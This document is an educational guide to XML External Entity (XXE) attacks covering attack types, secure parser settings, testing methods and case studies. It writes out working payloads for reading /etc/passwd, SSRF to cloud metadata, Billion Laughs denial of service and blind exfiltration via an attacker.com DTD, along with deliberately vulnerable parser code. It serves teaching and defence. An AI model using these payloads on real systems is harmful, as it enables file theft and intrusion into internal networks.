# XXE (XML External Entity) - Comprehensive Guide

## **Introduction**

XXE (XML External Entity) is a vulnerability that allows attackers to exploit XML parsers by including external entities, leading to information disclosure, SSRF attacks, or denial of service. It ranks #4 in OWASP Top 10 2017.

### **What XXE is Used For**

Attackers use XXE to:

- **Read local files** from the server filesystem
- **Perform SSRF attacks** by making HTTP requests from the server
- **Cause denial of service** through entity expansion attacks
- **Extract sensitive data** from configuration files
- **Access internal network resources** via SSRF

### **Why XXE is Dangerous**

**Severity:**

- ✅ **High Impact**: Can lead to complete file system access
- ✅ **Common**: Found in many XML processing applications
- ✅ **Can lead to SSRF**: May enable access to internal networks
- ✅ **Hard to Detect**: May not show obvious errors
- ✅ **Widespread**: Affects any application processing XML

---

## **What is XXE**

XXE (XML External Entity) occurs when an XML parser processes external entities defined in XML documents without proper restrictions, allowing attackers to read files, perform network requests, or cause denial of service.

### **Basic Example**

**Vulnerable XML Parser:**

```python
from xml.etree.ElementTree import parse
from flask import request

@app.route('/upload', methods=['POST'])
def upload_file():
    xml_data = request.data
    tree = parse(xml_data)  # XXE vulnerability!
    return "OK"

```

**Attack:**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>

```

**Result:** Application reads and returns contents of `/etc/passwd`

---

## **How XXE Works**

### **XML Entities**

**Internal Entities:**

```xml
<!ENTITY name "value">

```

- Defined within the document
- Relatively safe (with proper validation)

**External Entities:**

```xml
<!ENTITY xxe SYSTEM "file:///path/to/file">

```

- Reference external resources
- Can be dangerous if not restricted

**Parameter Entities (DTD only):**

```xml
<!ENTITY % xxe SYSTEM "file:///path/to/file">

```

- Used in DTD definitions
- Can be chained for complex attacks

### **Attack Flow**

**1. Attacker submits malicious XML:**

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>

```

**2. XML Parser Processes DTD:**

- Parser reads DOCTYPE declaration
- Defines external entity `xxe`
- Resolves `file:///etc/passwd` URI

**3. Entity Expansion:**

- Parser expands `&xxe;` entity
- Replaces with contents of `/etc/passwd`
- Includes sensitive file contents in response

**4. Attacker Receives Data:**

- File contents returned in XML response
- Attacker extracts sensitive information

---

## **Types of XXE Attacks**

### **1. File Disclosure (In-Band)**

**Description:** Attacker reads local files, with file contents returned directly in the response.

**Example:**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>

```

**Result:**

```xml
<foo>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...</foo>

```

---

### **2. SSRF (Server-Side Request Forgery)**

**Description:** Attacker makes the server perform HTTP requests to internal or external resources.

**Example:**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server:8080/admin">
]>
<foo>&xxe;</foo>

```

**Result:** Server makes HTTP request to `http://internal-server:8080/admin`

---

### **3. Blind XXE (Out-of-Band)**

**Description:** Attacker extracts data indirectly via external servers, when file contents aren't returned directly.

**Example:**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<foo>test</foo>

```

**evil.dtd (on attacker's server):**

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?%file;'>">
%eval;
%exfil;

```

**Result:** File contents sent to attacker's server via HTTP request

---

### **4. Denial of Service (DoS)**

**Description:** Attacker causes entity expansion attacks (Billion Laughs attack) to exhaust server resources.

**Example (Billion Laughs Attack):**

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>

```

**Result:** Massive entity expansion exhausts memory/CPU

---

## **Impact of XXE**

### **1. Information Disclosure**

**Impact:**

- Read sensitive files (passwords, keys, configs)
- Access source code
- Extract database credentials

**Example Files:**

- `/etc/passwd`
- `/etc/shadow`
- Application configuration files
- Private keys
- Database credentials

---

### **2. Server-Side Request Forgery (SSRF)**

**Impact:**

- Access internal services
- Port scanning
- Access cloud metadata APIs
- Internal network reconnaissance

**Example:**

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">

```

---

### **3. Denial of Service**

**Impact:**

- Server resource exhaustion
- Application unavailability
- Performance degradation

---

### **4. Remote Code Execution (Rare)**

**Impact:**

- In some cases, XXE can lead to RCE
- Often requires specific configurations
- More common in PHP applications

---

## **Mitigation Strategies**

### **1. Disable External Entities (Primary Defense)**

**Python (defusedxml - Recommended):**

```python
from defusedxml.ElementTree import parse

xml_data = request.data
tree = parse(xml_data)  # Safe! External entities disabled by default

```

**Python (lxml - Secure Configuration):**

```python
from lxml import etree

parser = etree.XMLParser(resolve_entities=False, no_network=True)
tree = etree.parse(xml_data, parser)

```

**Java:**

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setExpandEntityReferences(false);

```

---

### **2. Use Secure XML Parsers**

**Python:**

- ✅ **defusedxml** - Secure by default
- ❌ **xml.etree.ElementTree** - Vulnerable by default

**Java:**

- ✅ Configure `DocumentBuilderFactory` securely
- ❌ Default configurations vulnerable

---

### **3. Input Validation**

**Whitelist Approach:**

```python
import re

def validate_xml(xml_data):
    # Reject XML with DOCTYPE declarations
    if b'<!DOCTYPE' in xml_data:
        raise ValueError("DOCTYPE declarations not allowed")
    return xml_data

```

---

### **4. Use Simple Data Formats**

**When Possible:**

- Use JSON instead of XML
- Use YAML (with safe loading)
- Avoid XML if not necessary

---

## **Best Practices**

### **1. Always Use Secure Parsers**

**✅ CORRECT:**

```python
from defusedxml.ElementTree import parse
tree = parse(xml_data)

```

**❌ WRONG:**

```python
from xml.etree.ElementTree import parse
tree = parse(xml_data)  # Vulnerable!

```

---

### **2. Disable External Entities Explicitly**

**✅ CORRECT:**

```python
from lxml import etree

parser = etree.XMLParser(resolve_entities=False, no_network=True)
tree = etree.parse(xml_data, parser)

```

---

### **3. Validate XML Structure**

**✅ CORRECT:**

```python
def validate_xml_structure(xml_data):
    # Reject DOCTYPE declarations
    if b'<!DOCTYPE' in xml_data:
        raise ValueError("DOCTYPE not allowed")

    # Use secure parser
    from defusedxml.ElementTree import parse
    tree = parse(xml_data)
    return tree

```

---

### **4. Use JSON When Possible**

**✅ CORRECT:**

```python
import json

data = json.loads(request.data)  # Much safer than XML!

```

---

## **Advanced Exploitation Techniques**

### **1. Parameter Entity Attacks**

**Technique:** Use parameter entities to chain entity definitions.

**Example:**

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>

```

**evil.dtd:**

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?%file;'>">
%eval;
%exfil;

```

---

### **2. UTF-8 Encoding Bypass**

**Technique:** Use different encoding to bypass filters.

**Example:**

```xml
<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>

```

---

### **3. XML Schema Attacks**

**Technique:** Exploit XML Schema imports.

**Example:**

```xml
<?xml version="1.0"?>
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
  <xs:import schemaLocation="http://attacker.com/evil.xsd"/>
</xs:schema>

```

---

## **Penetration Testing Methodology**

### **XXE Testing Checklist**

**1. Identify XML Input Points:**

- File uploads (Office docs, SVG images)
- SOAP endpoints
- REST APIs accepting XML
- Configuration file processing

**2. Test Basic XXE:**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>

```

**3. Test SSRF:**

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">

```

**4. Test Blind XXE:**

```xml
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;

```

**5. Analyze Responses:**

- Check for file contents in response
- Monitor network traffic for outbound requests
- Check for error messages revealing file access

---

### **Testing Tools**

**1. Burp Suite:**

- XXE plugin
- Manual payload crafting
- Response analysis

**2. Custom Scripts:**

```python
import requests

xxe_payload = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>"""

response = requests.post(url, data=xxe_payload)
if "root:" in response.text:
    print("XXE vulnerability found!")

```

---

## **Threat Modeling (STRIDE Framework)**

### **Spoofing**

**Threat:** Attacker spoofs internal network requests via SSRF.

**Mitigation:**

- Disable external entities
- Network segmentation
- Restrict outbound connections

**Risk Rating:** High

---

### **Tampering**

**Threat:** Attacker modifies XML structure to exploit parser.

**Mitigation:**

- Input validation
- Secure parsers
- Whitelist XML structures

**Risk Rating:** Medium

---

### **Repudiation**

**Threat:** Actions via XXE cannot be attributed.

**Mitigation:**

- Comprehensive logging
- Request correlation
- Audit trails

**Risk Rating:** Medium

---

### **Information Disclosure**

**Threat:** Attacker accesses sensitive files via XXE.

**Mitigation:**

- Disable external entities
- Secure file permissions
- Input validation

**Risk Rating:** Critical

---

### **Denial of Service**

**Threat:** Attacker causes DoS via entity expansion.

**Mitigation:**

- Disable external entities
- Resource limits
- Entity expansion limits

**Risk Rating:** High

---

### **Elevation of Privilege**

**Threat:** Attacker gains access to internal resources via SSRF.

**Mitigation:**

- Disable external entities
- Network segmentation
- Least privilege

**Risk Rating:** Critical

---

## **Real-World Case Studies**

### **Case Study 1: File Disclosure in SOAP Endpoint**

**Background:** Penetration test discovered XXE in SOAP web service.

**Vulnerable Code:**

```python
from xml.etree.ElementTree import parse
from flask import request

@app.route('/soap', methods=['POST'])
def soap_handler():
    xml_data = request.data
    tree = parse(xml_data)  # Vulnerable!
    # Process SOAP request
    return soap_response

```

**Exploitation:**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope>
  <soap:Body>
    <foo>&xxe;</foo>
  </soap:Body>
</soap:Envelope>

```

**Impact:**

- **Confidentiality**: Critical - File system access
- **Integrity**: High - Could access configuration files
- **Business Impact**: Critical - Complete information disclosure

**Remediation:**

```python
from defusedxml.ElementTree import parse

@app.route('/soap', methods=['POST'])
def soap_handler():
    xml_data = request.data
    tree = parse(xml_data)  # Safe!
    return soap_response

```

---

### **Case Study 2: SSRF via XML Upload**

**Background:** Security assessment revealed XXE in file upload functionality.

**Vulnerable Code:**

```python
@app.route('/upload', methods=['POST'])
def upload_file():
    file_content = request.files['file'].read()
    # Process as XML (Office documents contain XML)
    tree = parse(file_content)  # Vulnerable!
    return "File uploaded"

```

**Exploitation:**

- Attacker creates malicious Office document with XXE payload
- Uploads document
- Server processes XML, makes HTTP request to internal service

**Impact:**

- **Confidentiality**: Critical - Internal network access
- **Business Impact**: Critical - SSRF to internal services

**Remediation:**

```python
from defusedxml.ElementTree import parse

@app.route('/upload', methods=['POST'])
def upload_file():
    file_content = request.files['file'].read()
    tree = parse(file_content)  # Safe!
    return "File uploaded"

```

---

## **Advanced Mitigations**

### **Defense in Depth Strategy**

**Layer 1: Secure XML Parser (Primary Defense)**

```python
from defusedxml.ElementTree import parse
tree = parse(xml_data)

```

**Layer 2: Input Validation**

```python
def validate_xml(xml_data):
    if b'<!DOCTYPE' in xml_data:
        raise ValueError("DOCTYPE not allowed")
    return xml_data

```

**Layer 3: Network Restrictions**

- Restrict outbound connections
- Network segmentation
- Firewall rules

**Layer 4: File System Permissions**

- Least privilege file access
- Secure configuration files
- Read-only where possible

---

## **SAST/DAST Detection**

### **SAST (Static Application Security Testing)**

**Vulnerable Code Patterns:**

**1. Unsafe XML Parser:**

```python
# ❌ VULNERABLE
from xml.etree.ElementTree import parse
tree = parse(xml_data)

# SAST Detection:
# - Pattern: Use of unsafe XML parser
# - Severity: Critical
# - CWE: CWE-611 (Improper Restriction of XML External Entity Reference)

```

**2. Missing Parser Configuration:**

```python
# ❌ VULNERABLE
parser = etree.XMLParser()  # Default configuration
tree = etree.parse(xml_data, parser)

# SAST Detection:
# - Pattern: XML parser without secure configuration
# - Severity: Critical
# - CWE: CWE-611

```

---

### **DAST (Dynamic Application Security Testing)**

**Testing Methodology:**

**1. Identify XML Processing:**

- Find endpoints accepting XML
- Identify file upload functionality
- Check SOAP endpoints

**2. Submit XXE Payloads:**

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>

```

**3. Analyze Responses:**

- Check for file contents
- Monitor network traffic
- Check for error messages

**4. Test Blind XXE:**

- Use out-of-band techniques
- Monitor external server for requests

---

## **Risk Assessment**

### **Risk Matrix**

| Vulnerability | Likelihood | Impact | Risk Level | Business Impact |
| --- | --- | --- | --- | --- |
| **XXE with File Disclosure** | Medium | Critical | **Critical** | Complete file system access |
| **XXE with SSRF** | Medium | Critical | **Critical** | Internal network access |
| **Blind XXE** | Medium | High | **High** | Data exfiltration |
| **XXE DoS** | Medium | High | **High** | Service unavailability |
| **Missing Secure Parser** | High | Critical | **Critical** | Multiple attack vectors |

### **Risk Calculation**

**Example: XXE in SOAP Endpoint**

**Likelihood:** Medium (0.6)

- Requires XML processing
- Less common than other vulnerabilities
- Often overlooked

**Impact:** Critical (1.0)

- File system access
- SSRF potential
- Data breach

**Risk Score:** 0.6 × 1.0 = **0.6 (Critical Risk)**

**Business Impact:**

- **Financial**: Data breach, regulatory fines
- **Reputation**: Loss of customer trust
- **Legal**: GDPR/regulatory violations
- **Operational**: System compromise, data loss

---

## **Summary**

XXE is a critical vulnerability affecting XML processing. Key points:

1. **Always use secure XML parsers** - defusedxml, or configure parsers securely
2. **Disable external entities** - Primary defense against XXE
3. **Validate XML input** - Reject DOCTYPE declarations when possible
4. **Use JSON when possible** - Simpler and safer alternative
5. **Restrict network access** - Limit outbound connections
6. **Follow defense in depth** - Multiple layers of protection
7. **Test thoroughly** - Code reviews, SAST/DAST scanning

Remember: **XXE is prevented by using secure XML parsers with external entities disabled, not by input validation alone!**